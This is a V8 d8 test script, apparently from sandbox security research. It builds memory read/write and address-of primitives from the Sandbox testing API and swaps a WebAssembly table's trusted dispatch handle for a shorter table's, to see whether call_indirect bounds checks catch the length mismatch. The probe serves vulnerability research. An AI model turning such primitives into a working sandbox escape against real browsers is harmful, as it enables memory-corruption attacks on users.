// C21 H20: trusted_dispatch_table handle transplant with length mismatch.
//
// A WasmTableObject has sandbox-visible current_length/entries plus a trusted
// dispatch table handle. If the handle is transplanted from a shorter table,
// call_indirect index bounds may pass against current_length while dispatch
// lookup indexes beyond the trusted dispatch table length.
//
// This is intentionally not the known CPT reclaim chain. It only tests whether
// direct indirect-call lookup has a release guard for table length mismatch.

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

const kHeapObjectTag = 1;
const kWeakHeapObjectTag = 3;
const kTrustedDispatchTableOffset = 0x1c;
const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrof(obj) {
  return Sandbox.getAddressOf(obj) & ~kWeakHeapObjectTag;
}

function read32(addr) {
  return memory.getUint32(addr, true);
}

function write32(addr, val) {
  memory.setUint32(addr, val, true);
}

function makeTargets() {
  let b = new WasmModuleBuilder();
  let sig = b.addType(kSig_i_i);
  b.addFunction('f0', sig)
      .addBody([kExprLocalGet, 0, kExprI32Const, 0x10, kExprI32Add])
      .exportFunc();
  b.addFunction('f1', sig)
      .addBody([kExprLocalGet, 0, kExprI32Const, 0x20, kExprI32Add])
      .exportFunc();
  return b.instantiate().exports;
}

function makeCaller(table) {
  let b = new WasmModuleBuilder();
  let sig = b.addType(kSig_i_i);
  let t = b.addImportedTable('imp', 'table', 2, 2, kWasmFuncRef);
  b.addFunction('call', kSig_i_ii)
      .addBody([
        kExprLocalGet, 1,
        kExprLocalGet, 0,
        kExprCallIndirect, sig, t,
      ])
      .exportFunc();
  return b.instantiate({imp: {table}}).exports.call;
}

let {f0, f1} = makeTargets();
let big = new WebAssembly.Table({element: 'anyfunc', initial: 2, maximum: 2});
let small = new WebAssembly.Table({element: 'anyfunc', initial: 1, maximum: 1});
big.set(0, f0);
big.set(1, f1);
small.set(0, f0);

let call = makeCaller(big);
let bigAddr = addrof(big);
let smallAddr = addrof(small);
let bigHandle = read32(bigAddr + kTrustedDispatchTableOffset);
let smallHandle = read32(smallAddr + kTrustedDispatchTableOffset);

print(`big_handle=0x${bigHandle.toString(16)}`);
print(`small_handle=0x${smallHandle.toString(16)}`);
print(`before0=${call(0, 7)}`);
print(`before1=${call(1, 7)}`);

write32(bigAddr + kTrustedDispatchTableOffset, smallHandle);

try {
  print(`after0=${call(0, 7)}`);
} catch (e) {
  print(`after0_throw=${e.name}:${e.message}`);
}

try {
  print(`after1=${call(1, 7)}`);
} catch (e) {
  print(`after1_throw=${e.name}:${e.message}`);
}
